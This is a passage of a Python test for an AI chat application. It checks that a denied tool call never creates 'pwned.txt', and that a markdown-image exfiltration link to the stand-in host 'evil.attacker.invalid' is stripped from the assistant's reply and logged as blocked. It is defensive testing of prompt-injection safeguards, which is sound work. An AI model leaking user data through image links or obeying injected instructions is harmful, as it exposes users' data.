                json={"decision": "deny", "scope": "once"},
                headers={"X-CSRF-Token": csrf},
            )

            fin = await app.state.run_manager.wait_for_run(run_id, max_wait_seconds=5.0)
            assert fin["status"] == "succeeded"

            # Verify pwned.txt was NEVER created
            ws_root = get_user_workspace_root(settings.data_dir, user_id)
            assert not (ws_root / "pwned.txt").exists()

            # Verify markdown image exfiltration was stripped and logged as a warning notice
            events = await app.state.run_manager.list_events(run_id, after_seq=0)
            assert any(
                e.type == "notice" and e.data.get("code") == "exfiltration_links_blocked"
                for e in events
            )
            detail = await app.state.chat_service.get_chat_detail(chat_id=chat_id, user_id=user_id)
            asst_msgs = [m for m in detail["messages"] if m["role"] == "assistant"]
            assert "evil.attacker.invalid" not in asst_msgs[-1]["content"]
            assert "[Blocked external image: leak]" in asst_msgs[-1]["content"]
